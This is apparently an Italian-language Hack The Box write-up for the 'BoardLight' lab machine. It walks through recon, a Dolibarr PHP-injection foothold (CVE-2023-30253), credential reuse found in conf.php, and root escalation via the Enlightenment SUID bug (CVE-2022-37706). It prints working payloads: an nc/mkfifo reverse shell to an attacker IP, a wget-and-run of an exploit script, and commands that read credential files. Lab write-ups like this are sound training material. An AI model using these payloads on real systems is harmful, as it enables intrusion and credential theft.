# BoardLight — HTB Writeup

| Field      | Info                  |
|------------|-----------------------|
| OS         | Linux                 |
| Difficulty | Easy                  |
| IP         | 10.129.231.37         |
| User flag  | ✅                    |
| Root flag  | ✅                    |

---

## Recon

### Nmap

```bash
nmap -p- --min-rate 10000 -oA nmap_allport 10.129.231.37
nmap -p 22,80 -sC -sV -oA nmap_detailed 10.129.231.37
```

![nmap](images/nmap.png)

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 |
| 80   | HTTP    | Apache httpd 2.4.41 |

---

## Web Enumeration

### Hostname discovery

Visitando la porta 80 si trova una landing page per una società di consulenza cybersecurity. Il footer rivela il dominio `board.htb`.

![homepage](images/boardlight-http-home.png)

```bash
echo "10.129.231.37 board.htb" | sudo tee -a /etc/hosts
```

### Virtual host fuzzing

```bash
ffuf -u http://board.htb \
     -H "Host: FUZZ.board.htb" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -fs 15949
```

Risultato: **`crm.board.htb`**

```bash
echo "10.129.231.37 crm.board.htb" | sudo tee -a /etc/hosts
```

### Directory brute force

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
     -u http://board.htb/FUZZ \
     -mc all -fs 15949 -fc 404 -c -v
```

Niente di rilevante sul dominio principale — la superficie di attacco è `crm.board.htb`.

---

## Foothold — CVE-2023-30253 (Dolibarr RCE)

### Accesso al CRM

Navigando su `http://crm.board.htb` si trova un pannello Dolibarr **17.0.0**.

![Dolibarr login](images/admin-http.png)

Login con credenziali di default: `admin / admin`.

### Vulnerability

**CVE-2023-30253** — Dolibarr < 17.0.1 permette a un utente autenticato di iniettare codice PHP nei template del modulo Website usando `<?PHP` (uppercase) per bypassare il filtro.

### Exploit manuale

1. **Websites → + → Create site** (nome qualsiasi)
2. **Pages → + → Add page** (template vuoto)
3. **Edit HTML Source** — inserire il payload

Test RCE:

```php
<?PHP echo system("whoami");?>
```

![command injection](images/command-injection.png)

Output: `www-data` — RCE confermato.

### Reverse shell

```bash
# Attacker
nc -lnvp 4444
```

Payload nel HTML source:

```php
<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.32 4444 >/tmp/f");?>
```

![reverse shell payload](images/reverse-shell.png)

Shell ottenuta come `www-data`:

![www-data](images/www-data.png)

### Shell stabilization

```bash
script /dev/null -c /bin/bash
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Lateral Movement — www-data → larissa

### Credenziali nel config di Dolibarr

```bash
cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
```

![credentials](images/pass_exploit.png)

```
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
```

### Utente di sistema

```bash
cat /etc/passwd | grep bash
# larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
```

![/etc/passwd](images/user-larissa.png)

La password del DB è riutilizzata per l'utente di sistema.

```bash
ssh larissa@board.htb
# password: serverfun2$2023!!
```

### User flag

```bash
cat ~/user.txt
```

---

## Privilege Escalation — CVE-2022-37706 (Enlightenment SUID)

### SUID enumeration

```bash
find / -perm -u=s -type f 2>/dev/null
```

![SUID binaries](images/perm.png)

Tra i risultati spicca:

```
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
```

Binario SUID root, owner: root.

### Version check

```bash
enlightenment --version
# Version: 0.23.1
```

![enlightenment version](images/interest.png)

### Vulnerability

**CVE-2022-37706** — `enlightenment_sys` in Enlightenment < 0.25.4 esegue con privilegi SUID root e gestisce in modo errato path che iniziano con `/dev/..`, permettendo l'esecuzione di comandi arbitrari come root.

### Exploit

```bash
# Attacker — download e serve l'exploit
wget https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/main/exploit.sh
python3 -m http.server 8080

# Target
cd /tmp
wget http://10.10.14.32:8080/exploit.sh
bash exploit.sh
```

![privilege escalation](images/privilege_escalation.png)

Shell root ottenuta:

![root shell](images/root.png)

### Root flag

```bash
cat /root/root.txt
```

![root flag](images/root_flag.png)

---

## Loot

| Username    | Password           | Dove trovato              |
|-------------|--------------------|---------------------------|
| admin       | admin              | Default credentials       |
| dolibarrowner | serverfun2$2023!! | conf.php                 |
| larissa     | serverfun2$2023!!  | Password reuse            |

---

## Lessons Learned

1. **Credential reuse** — la password del database era identica a quella dell'utente SSH di sistema. Sempre testare il riutilizzo.
2. **Default credentials** — `admin/admin` su un pannello esposto a internet è un fail immediato. Dolibarr non forza il cambio password al primo accesso.
3. **SUID audit** — `find / -perm -u=s` è uno dei primi check da fare dopo l'accesso. Un binario SUID non standard (Enlightenment) ha fornito il vettore di escalation diretto a root.

---

## CVE Reference

| CVE | Descrizione | CVSS |
|-----|-------------|------|
| CVE-2023-30253 | Dolibarr ≤ 17.0.0 authenticated RCE via PHP injection | High |
| CVE-2022-37706 | Enlightenment < 0.25.4 SUID local privilege escalation | High |
